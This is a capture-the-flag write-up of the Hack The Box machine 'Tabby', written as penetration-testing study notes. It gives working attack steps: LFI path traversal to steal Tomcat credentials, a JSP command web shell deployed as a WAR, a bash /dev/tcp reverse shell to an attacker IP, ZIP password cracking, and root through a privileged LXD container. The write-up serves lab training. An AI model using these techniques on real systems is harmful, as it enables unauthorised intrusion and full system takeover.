# Tabby (HTB)

> Platform: Hack The Box  
> OS: Linux  
> Difficulty: Easy  
> Result: root

---

## Attack Chain

```text
Reconnaissance
├── nmap -p- --min-rate=5000 -T4 → 22 (SSH), 80 (Apache "Mega Hosting"), 8080 (Tomcat)
└── /etc/hosts: 10.129.77.170 tabby.htb megahosting.htb

Foothold (LFI → Tomcat creds)
├── news.php?file=statement → LFI
├── ../../../../etc/passwd → ash (uid 1000)
├── ../../../../usr/share/tomcat9/etc/tomcat-users.xml
└── tomcat:<PASSWORD> (admin-gui,manager-script)

Exploitation (WAR deploy)
├── /manager/html → 401 (no manager-gui)
├── /manager/text/list → OK (manager-script works)
├── jar -cvf cmd.war cmd.jsp
├── curl -T cmd.war ".../manager/text/deploy?path=/cmd&update=true"
└── shell as tomcat (uid 997)

Lateral Movement (ZIP crack)
├── /var/www/html/files/16162020_backup.zip
├── zip2john → john → <PASSWORD>
├── su ash → <PASSWORD>
└── cat /home/ash/user.txt → <USER_FLAG>

Privilege Escalation (LXD)
├── id → groups=...,116(lxd)
├── lxc storage create default dir
├── lxc profile device add default root disk path=/ pool=default
├── lxc image import /home/ash/alpine.tar.gz --alias alpine
├── lxc init alpine privesc -c security.privileged=true
├── lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
├── lxc start privesc && lxc exec privesc /bin/sh
└── cat /mnt/root/root/root.txt → <ROOT_FLAG>
```

> [!NOTE]
> All flags, passwords, hashes, and session tokens have been masked for ethical reasons.

---

## Machine Briefing

Apache 2.4.41 (Mega Hosting) and Tomcat 9.0.31 on Ubuntu 20.04. The second vhost `megahosting.htb` is vulnerable to LFI, which allows reading `tomcat-users.xml` and gaining access to the Tomcat `manager/text` interface. Deploying a WAR file gives a shell as `tomcat`. A password-protected ZIP then yields the password for `ash`, and the `lxd` group provides root via a privileged container.

---

## Reconnaissance

### Port Scan

```bash
nmap -p- --min-rate=5000 --max-retries 1 --defeat-rst-ratelimit -T4 -Pn -n tabby.htb -oA scans/quick
nmap -sC -sV -Pn -n --open -p 22,80,8080 tabby.htb -oA scans/detail
```

| Port | Service | Version                              |
|------|---------|--------------------------------------|
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu 4               |
| 80   | HTTP    | Apache httpd 2.4.41 (Ubuntu)         |
| 8080 | HTTP    | Apache Tomcat                        |

```bash
echo "10.129.77.170    tabby.htb megahosting.htb" | sudo tee -a /etc/hosts
```

### Vhost Enumeration

The main page HTML contains an external link:

```html
<li><a href="http://megahosting.htb/news.php?file=statement">News</a></li>
```

So the same server hosts a second vhost `megahosting.htb`, and `news.php` accepts a `file` parameter.

---

## Foothold (LFI → Tomcat creds)

### Confirming LFI

```bash
curl -s "http://megahosting.htb/news.php?file=../../../../etc/passwd"
```

Output contains the line `ash:x:1000:1000:clive:/home/ash:/bin/bash`.

### Reading Tomcat configuration

On Ubuntu, the `tomcat9` package stores its configuration under `/usr/share/tomcat9/etc/`:

```bash
curl -s "http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml"
```

**Result:**

```xml
<role rolename="admin-gui"/>
<role rolename="manager-script"/>
<user username="tomcat" password="<PASSWORD>" roles="admin-gui,manager-script"/>
```

**Key point:** the user `tomcat` has only the `admin-gui` and `manager-script` roles. There is no `manager-gui` role, so `/manager/html` returns 401. But `manager-script` gives access to the `/manager/text` interface.

---

## Exploitation (WAR deploy)

No CVE (custom vulnerability) - local file inclusion in the custom `news.php` endpoint exposes the Tomcat `manager-script` credentials from `tomcat-users.xml`; deploying a WAR file gives RCE as the `tomcat` user.

### Verifying access

```bash
curl -s -u 'tomcat:<PASSWORD>' http://tabby.htb:8080/manager/text/list
```

**Result:**

```
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:0:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
```

### Building the WAR file

```bash
mkdir -p /tmp/tabby-war
cat > /tmp/tabby-war/cmd.jsp <<'EOF'
<%@ page import="java.util.*,java.io.*"%>
<%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) out.println(line);
  }
%>
EOF

cd /tmp/tabby-war
jar -cvf /tmp/cmd.war cmd.jsp
```

### Deploy and reverse shell

```bash
nc -lvnp 4444

curl -u 'tomcat:<PASSWORD>' \
  --upload-file /tmp/cmd.war \
  "http://tabby.htb:8080/manager/text/deploy?path=/cmd&update=true"
# OK - Deployed application at context path [/cmd]
```

We call the JSP with `curl --data-urlencode` so that Tomcat 9's strict request-target check does not reject the payload:

```bash
curl -s -G "http://tabby.htb:8080/cmd/cmd.jsp" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.82/4444 0>&1'"
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

**Shell as `tomcat` (uid 997).**

### Stabilize

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Lateral Movement (ZIP crack)

### Finding the archive

```bash
ls -la /var/www/html/files/
```

**Result:**

```
-rw-r--r-- 1 ash  ash  8716 Jun 16  2020 16162020_backup.zip
```

### Download and crack

```bash
# On Kali
wget http://megahosting.htb/files/16162020_backup.zip -O backup.zip
zip2john backup.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
# <PASSWORD>
```

### Pivot

```bash
su ash
# password: <PASSWORD>
cat /home/ash/user.txt
# <USER_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Privilege Escalation (LXD)

### Enumeration

```bash
id
```

**Result:**

```
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

The `lxd` group allows creating a privileged container and mounting the host filesystem into it.

### Building an Alpine image (on Kali)

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
python3 -m http.server 8000
```

### Uploading the image and running LXD

```bash
# On the target, as ash
cd /home/ash
wget http://10.10.14.82:8000/alpine-v3.24-x86_64-*.tar.gz -O alpine.tar.gz

export PATH=$PATH:/snap/bin
lxc image import /home/ash/alpine.tar.gz --alias alpine

lxc storage create default dir
lxc profile device add default root disk path=/ pool=default

lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
```

**Important nuance:** the snap version of LXD cannot see `/tmp` - so the image must be copied to `/home/ash/`. Also, `lxc init` fails without a storage pool - `lxc storage create default dir` and a profile update are required.

### Root flag

```bash
lxc exec privesc /bin/sh
# Inside the container:
cd /mnt/root/root
cat root.txt
# <ROOT_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Flags

| Flag | Value                            |
|------|----------------------------------|
| User | <USER_FLAG> |
| Root | <ROOT_FLAG> |

---

## Key Takeaways

- **Finding the second vhost** - an external link on the main site is enough; always read the HTML carefully.
- **LFI + configuration file** - `tomcat-users.xml` stores credentials in cleartext; on the Ubuntu package the path is `/usr/share/tomcat9/etc/`.
- **The `manager-script` role replaces `manager-gui`** - the GUI returns 401, but `manager/text` is sufficient for deployment.
- **`curl --data-urlencode`** - Tomcat 9 has a strict request-target check, so parameters to the JSP must be passed this way.
- **Password reuse** - the ZIP archive password is the same as the `ash` user password.
- **LXD privileged container** - the `lxd` group is effectively equivalent to root; `security.privileged=true` + `source=/` is enough.
- **Snap LXD cannot see `/tmp`** - the image must be copied to the home directory. Also, a `storage pool` must be created before `lxc init`.
